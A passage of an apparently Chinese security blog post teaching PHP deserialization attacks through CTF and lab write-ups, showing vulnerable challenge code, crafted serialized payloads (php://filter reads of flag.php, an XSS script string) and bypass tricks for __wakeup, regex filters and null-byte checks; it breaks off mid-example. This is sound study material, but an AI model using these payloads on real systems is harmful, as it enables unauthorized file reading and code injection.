class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br></pre></td><td class="code"><pre><span class="line"> <span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">include</span>(<span class="string">&quot;flag.php&quot;</span>);</span><br><span class="line">highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">FileHandler</span> </span>&#123;</span><br><span class="line">    <span class="keyword">protected</span> <span class="variable">$op</span>;</span><br><span class="line">    <span class="keyword">protected</span> <span class="variable">$filename</span>;</span><br><span class="line">    <span class="keyword">protected</span> <span class="variable">$content</span>;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="variable">$op</span> = <span class="string">&quot;1&quot;</span>;</span><br><span class="line">        <span class="variable">$filename</span> = <span class="string">&quot;/tmp/tmpfile&quot;</span>;</span><br><span class="line">        <span class="variable">$content</span> = <span class="string">&quot;Hello World!&quot;</span>;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;process();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">process</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="keyword">$this</span>-&gt;op == <span class="string">&quot;1&quot;</span>) &#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;write();</span><br><span class="line">        &#125; <span class="keyword">else</span> <span class="keyword">if</span>(<span class="keyword">$this</span>-&gt;op == <span class="string">&quot;2&quot;</span>) &#123;</span><br><span class="line">            <span class="variable">$res</span> = <span class="keyword">$this</span>-&gt;read();</span><br><span class="line">            <span class="keyword">$this</span>-&gt;output(<span class="variable">$res</span>);</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;output(<span class="string">&quot;Bad Hacker!&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">private</span> <span class="function"><span class="keyword">function</span> <span class="title">write</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="keyword">$this</span>-&gt;filename) &amp;&amp; <span class="keyword">isset</span>(<span class="keyword">$this</span>-&gt;content)) &#123;</span><br><span class="line">            <span class="keyword">if</span>(strlen((<span class="keyword">string</span>)<span class="keyword">$this</span>-&gt;content) &gt; <span class="number">100</span>) &#123;</span><br><span class="line">                <span class="keyword">$this</span>-&gt;output(<span class="string">&quot;Too long!&quot;</span>);</span><br><span class="line">                <span class="keyword">die</span>();</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="variable">$res</span> = file_put_contents(<span class="keyword">$this</span>-&gt;filename, <span class="keyword">$this</span>-&gt;content);</span><br><span class="line">            <span class="keyword">if</span>(<span class="variable">$res</span>) <span class="keyword">$this</span>-&gt;output(<span class="string">&quot;Successful!&quot;</span>);</span><br><span class="line">            <span class="keyword">else</span> <span class="keyword">$this</span>-&gt;output(<span class="string">&quot;Failed!&quot;</span>);</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;output(<span class="string">&quot;Failed!&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">private</span> <span class="function"><span class="keyword">function</span> <span class="title">read</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="variable">$res</span> = <span class="string">&quot;&quot;</span>;</span><br><span class="line">        <span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="keyword">$this</span>-&gt;filename)) &#123;</span><br><span class="line">            <span class="variable">$res</span> = file_get_contents(<span class="keyword">$this</span>-&gt;filename);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="variable">$res</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">private</span> <span class="function"><span class="keyword">function</span> <span class="title">output</span>(<span class="params"><span class="variable">$s</span></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;[Result]: &lt;br&gt;&quot;</span>;</span><br><span class="line">        <span class="keyword">echo</span> <span class="variable">$s</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="keyword">$this</span>-&gt;op === <span class="string">&quot;2&quot;</span>)</span><br><span class="line">            <span class="keyword">$this</span>-&gt;op = <span class="string">&quot;1&quot;</span>;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;content = <span class="string">&quot;&quot;</span>;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;process();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">is_valid</span>(<span class="params"><span class="variable">$s</span></span>) </span>&#123;</span><br><span class="line">    <span class="keyword">for</span>(<span class="variable">$i</span> = <span class="number">0</span>; <span class="variable">$i</span> &lt; strlen(<span class="variable">$s</span>); <span class="variable">$i</span>++)</span><br><span class="line">        <span class="keyword">if</span>(!(ord(<span class="variable">$s</span>[<span class="variable">$i</span>]) &gt;= <span class="number">32</span> &amp;&amp; ord(<span class="variable">$s</span>[<span class="variable">$i</span>]) &lt;= <span class="number">125</span>))</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//传参</span></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>&#123;<span class="string">&#x27;str&#x27;</span>&#125;)) &#123;</span><br><span class="line">    <span class="variable">$str</span> = (<span class="keyword">string</span>)<span class="variable">$_GET</span>[<span class="string">&#x27;str&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(is_valid(<span class="variable">$str</span>)) &#123;</span><br><span class="line">        <span class="variable">$obj</span> = unserialize(<span class="variable">$str</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">解释：</span><br><span class="line">1.?str传参，绕过is_valid() 之后，进行反序列化unserialize(<span class="variable">$str</span>)，</span><br><span class="line">  传入类对象的序列化值，将会触发 __construct() ，最后销毁对象时，会触发 __destruct()</span><br><span class="line">2. __construct() 对变量初始化操作</span><br><span class="line">3. __destruct() op值对比：2的话强制转换成1；</span><br><span class="line">4.调用process()函数</span><br><span class="line">5.op == <span class="string">&quot;1&quot;</span>为写内容；op == <span class="string">&quot;2&quot;</span>为读取内容</span><br><span class="line">6.我们需要读取到 flag.php文件当中的内容，应该越过 3. 中对op的检测</span><br><span class="line">  可以使用 弱类型绕过 op=空格2 或者是 op=数字2 来越过===</span><br><span class="line">7.这样即使使用的不是字符串2，也可以满足==的条件，从而读取到内容</span><br></pre></td></tr></table></figure><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">FileHandler</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$op</span>=<span class="string">&#x27; 2&#x27;</span>; <span class="comment">//空格 2</span></span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$filename</span>=<span class="string">&#x27;flag.php&#x27;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$content</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$flag</span> = <span class="keyword">new</span> FileHandler();</span><br><span class="line"><span class="variable">$flag_1</span> = serialize(<span class="variable">$flag</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$flag_1</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"><span class="comment">//O:11:&quot;FileHandler&quot;:3:&#123;s:5:&quot;*op&quot;;s:2:&quot; 2&quot;;s:11:&quot;*filename&quot;;s:8:&quot;flag.php&quot;;s:10:&quot;*content&quot;;N;&#125;</span></span><br><span class="line">    </span><br><span class="line"><span class="comment">//O:11:&quot;FileHandler&quot;:3:&#123;s:2:&quot;op&quot;;s:2:&quot; 2&quot;;s:8:&quot;filename&quot;;s:8:&quot;flag.php&quot;;s:7:&quot;content&quot;;N;&#125;</span></span><br><span class="line">    </span><br><span class="line"><span class="comment">//O:11:&quot;FileHandler&quot;:3:&#123;s:2:&quot;op&quot;;s:2:&quot; 2&quot;;s:8:&quot;filename&quot;;s:57:&quot;php://filter/read=convert.base64-encode/resource=flag.php&quot;;s:7:&quot;content&quot;;N;&#125;</span></span><br></pre></td></tr></table></figure><p><strong>易错：</strong></p><p>​        <em><em>protected权限的变量在序列化的时会有%00</em>%00字符</em>*，%00字符的ASCII码为0，就无法通过上面的 is_valid函数校验。</p><p><strong>解决办法1：</strong> <strong>php7.1+版本对属性类型不敏感，本地序列化的时候将属性改为public进行绕过即可</strong></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">class FileHandler &#123;</span><br><span class="line">    public <span class="variable">$op</span>=<span class="string">&#x27; 2&#x27;</span>;</span><br><span class="line">    public <span class="variable">$filename</span>=<span class="string">&#x27;flag.php&#x27;</span>;</span><br><span class="line">    public <span class="variable">$content</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$flag</span> = new FileHandler();</span><br><span class="line"><span class="variable">$flag_1</span> = urlencode(serialize(<span class="variable">$flag</span>));</span><br><span class="line"><span class="built_in">echo</span> <span class="variable">$flag_1</span>;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><p><strong>解决办法2：</strong> <strong>%00更改为 \00，s 更改为 S</strong></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">FileHandler</span> </span>&#123;</span><br><span class="line">    <span class="keyword">protected</span> <span class="variable">$op</span>=<span class="string">&#x27; 2&#x27;</span>;</span><br><span class="line">    <span class="keyword">protected</span> <span class="variable">$filename</span>=<span class="string">&#x27;flag.php&#x27;</span>;</span><br><span class="line">    <span class="keyword">protected</span> <span class="variable">$content</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$flag</span> = <span class="keyword">new</span> FileHandler();</span><br><span class="line"><span class="variable">$flag_1</span> = urlencode(serialize(<span class="variable">$flag</span>));</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$flag_1</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"><span class="comment">//将所得到的内容中 %00更改为 \00，s 更改为 S</span></span><br><span class="line"><span class="comment">//O%3A11%3A%22FileHandler%22%3A3%3A%7BS%3A5%3A%22\00%2A\00op%22%3BS%3A2%3A%22+2%22%3BS%3A11%3A%22\00%2A\00filename%22%3BS%3A8%3A%22flag.php%22%3BS%3A10%3A%22\00%2A\00content%22%3BN%3B%7D</span></span><br><span class="line"> </span><br><span class="line"><span class="comment">//O%3A11%3A%22FileHandler%22%3A3%3A%7Bs%3A5%3A%22%00%2A%00op%22%3Bi%3A2%3Bs%3A11%3A%22%00%2A%00filename%22%3Bs%3A57%3A%22php%3A%2F%2Ffilter%2Fread%3Dconvert.base64-encode%2Fresource%3Dflag.php%22%3Bs%3A10%3A%22%00%2A%00content%22%3BN%3B%7D</span></span><br></pre></td></tr></table></figure><p><strong>pikachu</strong></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">S</span></span>&#123;</span><br><span class="line">    <span class="keyword">var</span> <span class="variable">$test</span> = <span class="string">&quot;pikachu&quot;</span>;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="keyword">$this</span>-&gt;test;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$html</span>=<span class="string">&#x27;&#x27;</span>;</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;o&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$s</span> = <span class="variable">$_POST</span>[<span class="string">&#x27;o&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(!@<span class="variable">$unser</span> = unserialize(<span class="variable">$s</span>))&#123;</span><br><span class="line">        <span class="variable">$html</span>.=<span class="string">&quot;&lt;p&gt;大兄弟,来点劲爆点儿的!&lt;/p&gt;&quot;</span>;</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="variable">$html</span>.=<span class="string">&quot;&lt;p&gt;<span class="subst">&#123;$unser-&gt;test&#125;</span>&lt;/p&gt;&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//获取payload</span></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">S</span></span>&#123;</span><br><span class="line"><span class="keyword">var</span> <span class="variable">$test</span> = <span class="string">&quot;&lt;script&gt;alert(/xss/)&lt;/script&gt;&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$unser</span> = <span class="keyword">new</span> S();</span><br><span class="line"><span class="keyword">echo</span> serialize(<span class="variable">$unser</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"><span class="comment">//O:1:&quot;S&quot;:1:&#123;s:4:&quot;test&quot;;s:29:&quot;&lt;script&gt;alert(/xss/)&lt;/script&gt;&quot;;&#125;</span></span><br></pre></td></tr></table></figure><h3 id="1-5-2-“百度杯”CTF比赛-十月场"><a href="#1-5-2-“百度杯”CTF比赛-十月场" class="headerlink" title="1.5.2 “百度杯”CTF比赛 十月场"></a>1.5.2 “百度杯”CTF比赛 十月场</h3><p><a href="https://www.ichunqiu.com/battalion?t=1&r=54967">题目链接</a></p><p>index.php?key=123&amp;hash=f9109d5f83921a551cf859f853afe7bb</p><p>查看源代码</p><p><img src="https://i.loli.net/2021/09/10/XohASq2FvtG3Q4C.png" alt="image-20210910214204513"></p><p>进行 md5 解密，得到  <em>kkkkkk01123</em> </p><p>则 <code>$key=</code></p><p>根据题目，不能使 ?key=123</p><p>则我们传入 ?key=111&amp;hash=adaa10eef3a02754da03b5a3a6f40ae6</p><p>得到 next step is Gu3ss_m3_h2h2.php</p><p>然后我们访问 Gu3ss_m3_h2h2.php</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">class Demo &#123;</span><br><span class="line">    private <span class="variable">$file</span> = <span class="string">&#x27;Gu3ss_m3_h2h2.php&#x27;</span>;</span><br><span class="line"></span><br><span class="line">    public <span class="keyword">function</span> __construct(<span class="variable">$file</span>) &#123;</span><br><span class="line">        <span class="variable">$this</span>-&gt;file = <span class="variable">$file</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">function</span> <span class="function"><span class="title">__destruct</span></span>() &#123;</span><br><span class="line">        <span class="built_in">echo</span> @highlight_file(<span class="variable">$this</span>-&gt;file, <span class="literal">true</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">function</span> <span class="function"><span class="title">__wakeup</span></span>() &#123;</span><br><span class="line">        <span class="keyword">if</span> (<span class="variable">$this</span>-&gt;file != <span class="string">&#x27;Gu3ss_m3_h2h2.php&#x27;</span>) &#123;</span><br><span class="line">            //the secret is <span class="keyword">in</span> the f15g_1s_here.php</span><br><span class="line">            <span class="variable">$this</span>-&gt;file = <span class="string">&#x27;Gu3ss_m3_h2h2.php&#x27;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (isset(<span class="variable">$_GET</span>[<span class="string">&#x27;var&#x27;</span>])) &#123;</span><br><span class="line">    <span class="variable">$var</span> = base64_decode(<span class="variable">$_GET</span>[<span class="string">&#x27;var&#x27;</span>]);</span><br><span class="line">    <span class="keyword">if</span> (preg_match(<span class="string">&#x27;/[oc]:\d+:/i&#x27;</span>, <span class="variable">$var</span>)) &#123;</span><br><span class="line">        die(<span class="string">&#x27;stop hacking!&#x27;</span>);</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line"></span><br><span class="line">        @unserialize(<span class="variable">$var</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    highlight_file(<span class="string">&quot;Gu3ss_m3_h2h2.php&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><h2 id="1-6-反序列化绕过技巧"><a href="#1-6-反序列化绕过技巧" class="headerlink" title="1.6 反序列化绕过技巧"></a>1.6 反序列化绕过技巧</h2><h3 id="1-6-1-php7-1-反序列化对类属性不敏感"><a href="#1-6-1-php7-1-反序列化对类属性不敏感" class="headerlink" title="1.6.1 php7.1+反序列化对类属性不敏感"></a>1.6.1 php7.1+反序列化对类属性不敏感</h3><p>测试环境：php7.2.9</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">class <span class="built_in">test</span>&#123;</span><br><span class="line">    protected <span class="variable">$a</span>;</span><br><span class="line">    public <span class="keyword">function</span> <span class="function"><span class="title">__construct</span></span>()&#123;</span><br><span class="line">        <span class="variable">$this</span>-&gt;a = <span class="string">&#x27;abc&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    public <span class="keyword">function</span>  <span class="function"><span class="title">__destruct</span></span>()&#123;</span><br><span class="line">        <span class="built_in">echo</span> <span class="variable">$this</span>-&gt;a;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">unserialize(<span class="string">&#x27;O:4:&quot;test&quot;:1:&#123;s:1:&quot;a&quot;;s:3:&quot;abc&quot;;&#125;&#x27;</span>);</span><br></pre></td></tr></table></figure><p><img src="https://i.loli.net/2021/09/10/zupN4kL8dmvtAEK.png" alt="image-20210910173603013"></p><p>可以看到，即是 a 没有<code>%00*%00</code></p><p>也输出了 <code>abc</code></p><h3 id="1-6-2-wakeup-绕过"><a href="#1-6-2-wakeup-绕过" class="headerlink" title="1.6.2 __wakeup() 绕过"></a>1.6.2 <code>__wakeup()</code> 绕过</h3><p><strong>在反序列化字符串时，序列化字符串中属性个数的值大于实际属性个数时，会跳过 __wakeup()函数的执行 。</strong></p><p>环境： PHP5 &lt; 5.6.2   PHP7 &lt; 7.0.10</p><p>测试：php5.2.17</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">test</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$a</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">           <span class="keyword">$this</span>-&gt;a = <span class="string">&#x27;aaa&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;a = <span class="string">&#x27;bbb&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="keyword">$this</span>-&gt;a;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//$b = new test();</span></span><br><span class="line"><span class="comment">//echo serialize($b);</span></span><br><span class="line"><span class="comment">//O:4:&quot;test&quot;:1:&#123;s:1:&quot;a&quot;;s:3:&quot;aaa&quot;;&#125;aaa</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//属性个数 为 真实个数值  1</span></span><br><span class="line">unserialize(<span class="string">&#x27;O:4:&quot;test&quot;:1:&#123;s:1:&quot;a&quot;;s:3:&quot;aaa&quot;;&#125;&#x27;</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;&lt;br /&gt;&quot;</span>;</span><br><span class="line"><span class="comment">//属性个数 3 &gt; 真实个数值 1</span></span><br><span class="line">unserialize(<span class="string">&#x27;O:4:&quot;test&quot;:3:&#123;s:1:&quot;a&quot;;s:3:&quot;aaa&quot;;&#125;&#x27;</span>);</span><br></pre></td></tr></table></figure><p><img src="https://i.loli.net/2021/09/10/ZmtHakew1TCRDVr.png" alt="image-20210910175548494"></p><h3 id="1-6-3-正则绕过"><a href="#1-6-3-正则绕过" class="headerlink" title="1.6.3 正则绕过"></a>1.6.3 正则绕过</h3><p><code>preg_match(&#39;/^O:\d+/&#39;)</code>匹配序列化字符串是否是对象字符串开头</p><p>其中的 \d 匹配的是数字 [0-9]，其目的就是检测我们的字符串是否是对象字符串开头</p><p><strong>绕过1：<code>+</code> 绕过 (url 中传参使用 编码 %2b)</strong></p><p><strong>绕过2：<code>serialize(array(a))</code> 绕过  //a为要反序列化的对象(序列化结果开头是a，不影响作为数组元素的$a的析构)</strong></p><p>测试：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">test</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$a</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;a = <span class="string">&#x27;abc&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span>  <span class="title">__destruct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="keyword">$this</span>-&gt;a.PHP_EOL;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">match</span>(<span class="params"><span class="variable">$data</span></span>)</span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (preg_match(<span class="string">&#x27;/^O:\d+/&#x27;</span>,<span class="variable">$data</span>))&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&#x27;you lose!&#x27;</span>);</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="variable">$data</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$a</span> = <span class="string">&#x27;O:4:&quot;test&quot;:1:&#123;s:1:&quot;a&quot;;s:3:&quot;abc&quot;;&#125;&#x27;</span>;</span><br><span class="line"><span class="comment">// +号绕过</span></span><br><span class="line"><span class="variable">$b</span> = str_replace(<span class="string">&#x27;O:4&#x27;</span>,<span class="string">&#x27;O:+4&#x27;</span>, <span class="variable">$a</span>);</span><br><span class="line">unserialize(<span class="keyword">match</span>(<span class="variable">$b</span>));</span><br><span class="line"><span class="comment">// serialize(array($a));</span></span><br><span class="line">unserialize(<span class="string">&#x27;a:1:&#123;i:0;O:4:&quot;test&quot;:1:&#123;s:1:&quot;a&quot;;s:3:&quot;abc&quot;;&#125;&#125;&#x27;</span>);</span><br></pre></td></tr></table></figure><h3 id="1-6-4-十六进制绕过字符过滤"><a href="#1-6-4-十六进制绕过字符过滤" class="headerlink" title="1.6.4 十六进制绕过字符过滤"></a>1.6.4 十六进制绕过字符过滤</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">O:4:<span class="string">&quot;test&quot;</span>:2:&#123;s:4:<span class="string">&quot;%00*%00a&quot;</span>;s:3:<span class="string">&quot;abc&quot;</span>;s:7:<span class="string">&quot;%00test%00b&quot;</span>;s:3:<span class="string">&quot;def&quot;</span>;&#125;</span><br><span class="line">可以写成</span><br><span class="line">O:4:<span class="string">&quot;test&quot;</span>:2:&#123;S:4:<span class="string">&quot;\00*\00\61&quot;</span>;s:3:<span class="string">&quot;abc&quot;</span>;s:7:<span class="string">&quot;%00test%00b&quot;</span>;s:3:<span class="string">&quot;def&quot;</span>;&#125;</span><br><span class="line">表示字符类型的s大写时，会被当成16进制解析。</span><br></pre></td></tr></table></figure><p>示例：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">class <span class="built_in">test</span>&#123;</span><br><span class="line">    public <span 